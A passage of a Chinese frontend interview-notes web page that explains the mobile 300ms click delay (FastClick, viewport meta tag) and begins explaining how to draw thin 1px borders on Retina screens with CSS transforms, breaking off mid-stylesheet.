<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>知识广度-从前端到全栈 | 张晓伟-技术文档</title>
    <meta name="generator" content="VuePress 1.9.7">
    <link rel="icon" href="/images/photo.jpg">
    <link rel="manifest" href="/images/photo.jpg">
    <link rel="apple-touch-icon" href="/images/photo.jpg">
    <meta name="description" content="Personal Website">
    <meta http-quiv="pragma" cotent="no-cache">
    <meta http-quiv="pragma" cotent="no-cache,must-revalidate">
    <meta http-quiv="expires" cotent="0">
    
    <link rel="preload" href="/assets/css/0.styles.f46d1901.css" as="style"><link rel="preload" href="/assets/js/app.ac5ad06d.js" as="script"><link rel="preload" href="/assets/js/3.c24abbc0.js" as="script"><link rel="preload" href="/assets/js/8.4563f6fd.js" as="script"><link rel="prefetch" href="/assets/js/10.4fec8d03.js"><link rel="prefetch" href="/assets/js/100.992dc290.js"><link rel="prefetch" href="/assets/js/101.44509c85.js"><link rel="prefetch" href="/assets/js/102.956b0216.js"><link rel="prefetch" href="/assets/js/103.0083806d.js"><link rel="prefetch" href="/assets/js/104.d3d9a461.js"><link rel="prefetch" href="/assets/js/105.ee725b55.js"><link rel="prefetch" href="/assets/js/106.e0794f99.js"><link rel="prefetch" href="/assets/js/107.30abcf83.js"><link rel="prefetch" href="/assets/js/108.a7ebdef7.js"><link rel="prefetch" href="/assets/js/109.e61fb0a2.js"><link rel="prefetch" href="/assets/js/11.3fa19d12.js"><link rel="prefetch" href="/assets/js/110.1bdc75a2.js"><link rel="prefetch" href="/assets/js/111.ace68420.js"><link rel="prefetch" href="/assets/js/112.e50d891e.js"><link rel="prefetch" href="/assets/js/113.834ab4ca.js"><link rel="prefetch" href="/assets/js/114.1b3f5e5d.js"><link rel="prefetch" href="/assets/js/115.207013e4.js"><link rel="prefetch" href="/assets/js/116.15c76d7b.js"><link rel="prefetch" href="/assets/js/117.fb69ce83.js"><link rel="prefetch" href="/assets/js/118.f390ddaf.js"><link rel="prefetch" href="/assets/js/119.f88e1d30.js"><link rel="prefetch" href="/assets/js/12.ebaa0477.js"><link rel="prefetch" href="/assets/js/120.5d59a0e1.js"><link rel="prefetch" href="/assets/js/121.bf67b374.js"><link rel="prefetch" href="/assets/js/122.c73bc3e6.js"><link rel="prefetch" href="/assets/js/123.36e363e4.js"><link rel="prefetch" href="/assets/js/124.10c7815d.js"><link rel="prefetch" href="/assets/js/125.6bfdaa7f.js"><link rel="prefetch" href="/assets/js/126.b105ace1.js"><link rel="prefetch" href="/assets/js/127.603f4797.js"><link rel="prefetch" href="/assets/js/128.84b95f8e.js"><link rel="prefetch" href="/assets/js/129.e89f5af8.js"><link rel="prefetch" href="/assets/js/13.7502b3ed.js"><link rel="prefetch" href="/assets/js/130.7dbbdac1.js"><link rel="prefetch" href="/assets/js/131.24141011.js"><link rel="prefetch" href="/assets/js/132.9e3b6479.js"><link rel="prefetch" href="/assets/js/133.32c71b91.js"><link rel="prefetch" href="/assets/js/134.affa7fe9.js"><link rel="prefetch" href="/assets/js/135.06ff9d21.js"><link rel="prefetch" href="/assets/js/136.13323d46.js"><link rel="prefetch" href="/assets/js/137.5bb332e9.js"><link rel="prefetch" href="/assets/js/138.bad0911a.js"><link rel="prefetch" href="/assets/js/139.22b585b1.js"><link rel="prefetch" href="/assets/js/14.b0c75e60.js"><link rel="prefetch" href="/assets/js/140.30d9b40a.js"><link rel="prefetch" href="/assets/js/141.45b17106.js"><link rel="prefetch" href="/assets/js/142.9a98fd75.js"><link rel="prefetch" href="/assets/js/143.2aa20922.js"><link rel="prefetch" href="/assets/js/144.695d4acd.js"><link rel="prefetch" href="/assets/js/145.b2b2df24.js"><link rel="prefetch" href="/assets/js/146.b3c8c8db.js"><link rel="prefetch" href="/assets/js/147.6be833e8.js"><link rel="prefetch" href="/assets/js/148.9835db24.js"><link rel="prefetch" href="/assets/js/149.f9fc5086.js"><link rel="prefetch" href="/assets/js/15.feabe304.js"><link rel="prefetch" href="/assets/js/150.ec4d1cda.js"><link rel="prefetch" href="/assets/js/151.56de4c87.js"><link rel="prefetch" href="/assets/js/152.e9fa4bbf.js"><link rel="prefetch" href="/assets/js/153.b2a9188f.js"><link rel="prefetch" href="/assets/js/154.6da1de78.js"><link rel="prefetch" href="/assets/js/155.0361146d.js"><link rel="prefetch" href="/assets/js/16.a6767286.js"><link rel="prefetch" href="/assets/js/17.22c6ba9a.js"><link rel="prefetch" href="/assets/js/18.ef0cd39a.js"><link rel="prefetch" href="/assets/js/19.8899dfa5.js"><link rel="prefetch" href="/assets/js/2.ae6673a1.js"><link rel="prefetch" href="/assets/js/20.4c6f1994.js"><link rel="prefetch" href="/assets/js/21.26422e58.js"><link rel="prefetch" href="/assets/js/22.8afed43d.js"><link rel="prefetch" href="/assets/js/23.1a713867.js"><link rel="prefetch" href="/assets/js/24.0797cbc2.js"><link rel="prefetch" href="/assets/js/25.363cafd4.js"><link rel="prefetch" href="/assets/js/26.4c63cf94.js"><link rel="prefetch" href="/assets/js/27.5ddc91a4.js"><link rel="prefetch" href="/assets/js/28.1691ae01.js"><link rel="prefetch" href="/assets/js/29.b0550db7.js"><link rel="prefetch" href="/assets/js/30.6c54cab9.js"><link rel="prefetch" href="/assets/js/31.548c83d5.js"><link rel="prefetch" href="/assets/js/32.9cb080ba.js"><link rel="prefetch" href="/assets/js/33.c58d8b18.js"><link rel="prefetch" href="/assets/js/34.fc449b00.js"><link rel="prefetch" href="/assets/js/35.88763dbb.js"><link rel="prefetch" href="/assets/js/36.470f5da9.js"><link rel="prefetch" href="/assets/js/37.cfb818fb.js"><link rel="prefetch" href="/assets/js/38.02aa2797.js"><link rel="prefetch" href="/assets/js/39.d473d5bd.js"><link rel="prefetch" href="/assets/js/4.e0787ea2.js"><link rel="prefetch" href="/assets/js/40.c5f32118.js"><link rel="prefetch" href="/assets/js/41.1c48f55d.js"><link rel="prefetch" href="/assets/js/42.e1cad54b.js"><link rel="prefetch" href="/assets/js/43.f0ddfd79.js"><link rel="prefetch" href="/assets/js/44.b6739718.js"><link rel="prefetch" href="/assets/js/45.499d7119.js"><link rel="prefetch" href="/assets/js/46.719a84c3.js"><link rel="prefetch" href="/assets/js/47.43bfb159.js"><link rel="prefetch" href="/assets/js/48.1d57733c.js"><link rel="prefetch" href="/assets/js/49.217a24eb.js"><link rel="prefetch" href="/assets/js/5.57bdc345.js"><link rel="prefetch" href="/assets/js/50.d654b3f4.js"><link rel="prefetch" href="/assets/js/51.a67634e1.js"><link rel="prefetch" href="/assets/js/52.dadb4a39.js"><link rel="prefetch" href="/assets/js/53.c943b577.js"><link rel="prefetch" href="/assets/js/54.1f76b1fb.js"><link rel="prefetch" href="/assets/js/55.1adafb94.js"><link rel="prefetch" href="/assets/js/56.013a3ff7.js"><link rel="prefetch" href="/assets/js/57.d776ed64.js"><link rel="prefetch" href="/assets/js/58.92ad1eef.js"><link rel="prefetch" href="/assets/js/59.4a87bb2b.js"><link rel="prefetch" href="/assets/js/6.2c667b06.js"><link rel="prefetch" href="/assets/js/60.aa6ac53d.js"><link rel="prefetch" href="/assets/js/61.55b356a1.js"><link rel="prefetch" href="/assets/js/62.5bee3ccc.js"><link rel="prefetch" href="/assets/js/63.d9fe3bcf.js"><link rel="prefetch" href="/assets/js/64.a16d5b28.js"><link rel="prefetch" href="/assets/js/65.06d15671.js"><link rel="prefetch" href="/assets/js/66.00ec76c5.js"><link rel="prefetch" href="/assets/js/67.cf30dc53.js"><link rel="prefetch" href="/assets/js/68.8b981571.js"><link rel="prefetch" href="/assets/js/69.ac78ebab.js"><link rel="prefetch" href="/assets/js/7.818633d1.js"><link rel="prefetch" href="/assets/js/70.0cd461a4.js"><link rel="prefetch" href="/assets/js/71.26b88a69.js"><link rel="prefetch" href="/assets/js/72.a3ea13ac.js"><link rel="prefetch" href="/assets/js/73.0b7a21c0.js"><link rel="prefetch" href="/assets/js/74.cbbdc6d1.js"><link rel="prefetch" href="/assets/js/75.7e088dc7.js"><link rel="prefetch" href="/assets/js/76.647db7af.js"><link rel="prefetch" href="/assets/js/77.e19dce67.js"><link rel="prefetch" href="/assets/js/78.2435218a.js"><link rel="prefetch" href="/assets/js/79.2654ba52.js"><link rel="prefetch" href="/assets/js/80.82f9eeda.js"><link rel="prefetch" href="/assets/js/81.9f574172.js"><link rel="prefetch" href="/assets/js/82.c462304c.js"><link rel="prefetch" href="/assets/js/83.e1a6a150.js"><link rel="prefetch" href="/assets/js/84.218e1c49.js"><link rel="prefetch" href="/assets/js/85.0ad7284d.js"><link rel="prefetch" href="/assets/js/86.7a304dea.js"><link rel="prefetch" href="/assets/js/87.2b138ab8.js"><link rel="prefetch" href="/assets/js/88.5877c2af.js"><link rel="prefetch" href="/assets/js/89.afabfc0a.js"><link rel="prefetch" href="/assets/js/9.13bca455.js"><link rel="prefetch" href="/assets/js/90.37e88d63.js"><link rel="prefetch" href="/assets/js/91.38382406.js"><link rel="prefetch" href="/assets/js/92.cebffc90.js"><link rel="prefetch" href="/assets/js/93.db10cebc.js"><link rel="prefetch" href="/assets/js/94.588db323.js"><link rel="prefetch" href="/assets/js/95.b7a4532f.js"><link rel="prefetch" href="/assets/js/96.c3829955.js"><link rel="prefetch" href="/assets/js/97.3a8e2bd4.js"><link rel="prefetch" href="/assets/js/98.c338c453.js"><link rel="prefetch" href="/assets/js/99.d9f57dca.js">
    <link rel="stylesheet" href="/assets/css/0.styles.f46d1901.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">张晓伟-技术文档</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/engineering/" class="nav-link">
  吃透前端工程化
</a></div><div class="nav-item"><a href="/algorithm/" class="nav-link router-link-active">
  大前端
</a></div><div class="nav-item"><a href="/system/" class="nav-link">
  系统分析师
</a></div><div class="nav-item"><a href="/hand/" class="nav-link">
  源码系列
</a></div><div class="nav-item"><a href="/guide/" class="nav-link">
  数据可视化
</a></div><div class="nav-item"><a href="/mode/" class="nav-link">
  设计模式
</a></div><div class="nav-item"><a href="/publish/" class="nav-link">
  前端发布脚手架
</a></div><div class="nav-item"><a href="/wy/" class="nav-link">
  wy高级前端
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="个人Menu" class="dropdown-title"><span class="title">个人</span> <span class="arrow down"></span></button> <button type="button" aria-label="个人Menu" class="mobile-dropdown-title"><span class="title">个人</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://helloonetwo.github.io/xiao-ui-website" target="_blank" rel="noopener noreferrer" class="nav-link external">
  个人组件库
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.npmjs.com/package/js-util-zhangxiaowei" target="_blank" rel="noopener noreferrer" class="nav-link external">
  个人工具类
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.npmjs.com/package/generator-zxw-vue" target="_blank" rel="noopener noreferrer" class="nav-link external">
  vue脚手架
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.npmjs.com/package/zxw-pages" target="_blank" rel="noopener noreferrer" class="nav-link external">
  自动化构建工作流
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/engineering/" class="nav-link">
  吃透前端工程化
</a></div><div class="nav-item"><a href="/algorithm/" class="nav-link router-link-active">
  大前端
</a></div><div class="nav-item"><a href="/system/" class="nav-link">
  系统分析师
</a></div><div class="nav-item"><a href="/hand/" class="nav-link">
  源码系列
</a></div><div class="nav-item"><a href="/guide/" class="nav-link">
  数据可视化
</a></div><div class="nav-item"><a href="/mode/" class="nav-link">
  设计模式
</a></div><div class="nav-item"><a href="/publish/" class="nav-link">
  前端发布脚手架
</a></div><div class="nav-item"><a href="/wy/" class="nav-link">
  wy高级前端
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="个人Menu" class="dropdown-title"><span class="title">个人</span> <span class="arrow down"></span></button> <button type="button" aria-label="个人Menu" class="mobile-dropdown-title"><span class="title">个人</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://helloonetwo.github.io/xiao-ui-website" target="_blank" rel="noopener noreferrer" class="nav-link external">
  个人组件库
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.npmjs.com/package/js-util-zhangxiaowei" target="_blank" rel="noopener noreferrer" class="nav-link external">
  个人工具类
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.npmjs.com/package/generator-zxw-vue" target="_blank" rel="noopener noreferrer" class="nav-link external">
  vue脚手架
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.npmjs.com/package/zxw-pages" target="_blank" rel="noopener noreferrer" class="nav-link external">
  自动化构建工作流
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>JavaScript 深度剖析</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>二周刷完前端面试题目</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/algorithm/实际工作经验.html" class="sidebar-link">实际工作经验</a></li><li><a href="/algorithm/软技能.html" class="sidebar-link">软技能</a></li><li><a href="/algorithm/分析解决问题.html" class="sidebar-link">分析解决问题</a></li><li><a href="/algorithm/知识广度-从前端到全栈.html" class="active sidebar-link">知识广度-从前端到全栈</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#移动端-click-300ms-延迟" class="sidebar-link">移动端 click 300ms 延迟</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#_1px-宽度" class="sidebar-link">1px 宽度</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#cookie-和-token-区别" class="sidebar-link">cookie 和 token 区别</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#http-和-udp" class="sidebar-link">HTTP 和 UDP</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#https-中间人攻击" class="sidebar-link">https 中间人攻击</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#defer-和-async" class="sidebar-link">defer 和 async</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#前端攻击" class="sidebar-link">前端攻击</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#websocket" class="sidebar-link">webSocket</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#输入-url-到页面展示" class="sidebar-link">输入 url 到页面展示</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#网页多标签页之间的通讯" class="sidebar-link">网页多标签页之间的通讯</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#koa2-洋葱圈模型" class="sidebar-link">koa2 洋葱圈模型</a></li><li class="sidebar-sub-header"><a href="/algorithm/知识广度-从前端到全栈.html#为何需要-nodejs" class="sidebar-link">为何需要 nodejs</a></li></ul></li><li><a href="/algorithm/知识深度-原理和源码.html" class="sidebar-link">知识深度-原理和源码</a></li><li><a href="/algorithm/手写 Promie.html" class="sidebar-link">手写 Promise</a></li><li><a href="/algorithm/JS 异步编程.html" class="sidebar-link">函数式编程</a></li><li><a href="/algorithm/Event Loop.html" class="sidebar-link">Event Loop 机制</a></li><li><a href="/algorithm/TypeScript.html" class="sidebar-link">Typescript</a></li><li><a href="/algorithm/javascript性能优化.html" class="sidebar-link">javascript 性能优化</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>计算机网络</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>前端工程化实战</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>Vue.js 框架源码与进阶</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>Node 全栈开发</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h3 id="知识广度-从前端到全栈"><a href="#知识广度-从前端到全栈" class="header-anchor">#</a> 知识广度-从前端到全栈</h3> <div class="custom-block tip"><p class="custom-block-title">TIP</p> <p>知识广度-从前端到全栈</p></div> <h2 id="移动端-click-300ms-延迟"><a href="#移动端-click-300ms-延迟" class="header-anchor">#</a> 移动端 click 300ms 延迟</h2> <h3 id="题目"><a href="#题目" class="header-anchor">#</a> 题目</h3> <p>移动端 click 300ms 延迟，如何解决</p> <h3 id="背景"><a href="#背景" class="header-anchor">#</a> 背景</h3> <p>智能手机开始流行的前期，浏览器可以点击缩放（double tap to zoom）网页。这样在手机上就可以浏览 PC 网页，很酷炫。</p> <p><img src="/assets/img/nytimes.5ee9f417.jpeg" alt=""></p> <p>浏览器为了分辨 click 还是“点击缩放”，就强行把 click 时间延迟 300ms 触发。</p> <h3 id="初期解决方案"><a href="#初期解决方案" class="header-anchor">#</a> 初期解决方案</h3> <p><a href="https://www.npmjs.com/package/fastclick" target="_blank" rel="noopener noreferrer">FastClick<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 专门用于解决这个问题。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// FastClick 使用非常简单</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span> <span class="token string">&quot;load&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FastClick<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span> document<span class="token punctuation">.</span>body <span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span> <span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>它的内部原理是</p> <ul><li>监听 <code>touchend</code> 事件 （<code>touchstart</code> <code>touchend</code> 会先于 <code>click</code> 事件被触发）</li> <li>通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/CustomEvent" target="_blank" rel="noopener noreferrer">DOM 自定义事件<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 模拟一个 click 事件</li> <li>把 300ms 之后触发的 click 事件阻止掉</li></ul> <h3 id="现代浏览器的改进"><a href="#现代浏览器的改进" class="header-anchor">#</a> 现代浏览器的改进</h3> <p>随着近几年移动端响应式的大力发展，移动端网页和 PC 网页有不同的设计，不用再缩放查看。<br>
这 300ms 的延迟就多余了，现代浏览器可以通过禁止缩放来取消这 300ms 的延迟。</p> <ul><li>Chrome 32+ on Android</li> <li>iOS 9.3</li></ul> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="答案"><a href="#答案" class="header-anchor">#</a> 答案</h3> <ul><li>原因：点击缩放（double tap to zoom）网页</li> <li>可使用 FastClick 解决</li> <li>现代浏览器可使用 <code>width=device-width</code> 规避</li></ul> <h2 id="_1px-宽度"><a href="#_1px-宽度" class="header-anchor">#</a> 1px 宽度</h2> <p>注：文本小节</p> <h3 id="题目-2"><a href="#题目-2" class="header-anchor">#</a> 题目</h3> <p>Retina 屏 1px 像素问题，如何实现</p> <h3 id="介绍"><a href="#介绍" class="header-anchor">#</a> 介绍</h3> <p>该问题通常用于考察你是否做过移动端 h5 项目。<br>
如果你能知道这个问题，并且答出来，知道前因后果，证明你有过 h5 开发经验。<br>
否则就说明你没有 h5 的任何开发经验，尤其是你如果都不知道这个事情，那就更加说明这一点。</p> <h3 id="普通的-1px"><a href="#普通的-1px" class="header-anchor">#</a> 普通的 <code>1px</code></h3> <p>如果仅仅使用 css 的 <code>1px</code> 来设置 border ，那可能会出现比较粗的情况。<br>
因为，有些手机屏幕的 DPR = 2 ，即 <code>1px</code> 它会用两个物理像素来显示，就粗了。</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token selector">#box</span> <span class="token punctuation">{</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> 10px 0<span class="token punctuation">;</span>
    <span class="token property">border-bottom</span><span class="token punctuation">:</span> 1px solid #eee<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>如下图，上面是微信 app 的 border ，下面是 <code>1px</code> 的 border ，有明显的区别。显得很粗糙，很不精致，设计师不会允许这样的页面发布上线的。</p> <p><img src="/assets/img/border-1.865d06a9.png" alt=""></p> <p>PS：你不能直接写 <code>0.5px</code> ，浏览器兼容性不好，渲染出来可能还是 <code>1px</code> 的效果。</p> <h3 id="使用-transform-缩小"><a href="#使用-transform-缩小" class="header-anchor">#</a> 使用 <code>transform</code> 缩小</h3> <p>我们可以使用 css 伪类 + <code>transform</code> 来优化这一问题。即把默认的 <code>1px</code> 宽度给压缩 0.5 倍。</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token selector">#box</span> <span class="token punctuation">{</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> 10px 0<span class="token punctuation">;</span>
    <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">#box::before</span> <span class="token punctuation">{</span>
    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
    <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 1px<span class="token punctuation">;</span>
    <span class="token property">background</span><span class="token punctuation">:</span> #d9d9d9<span class="token punctuation">;</span>
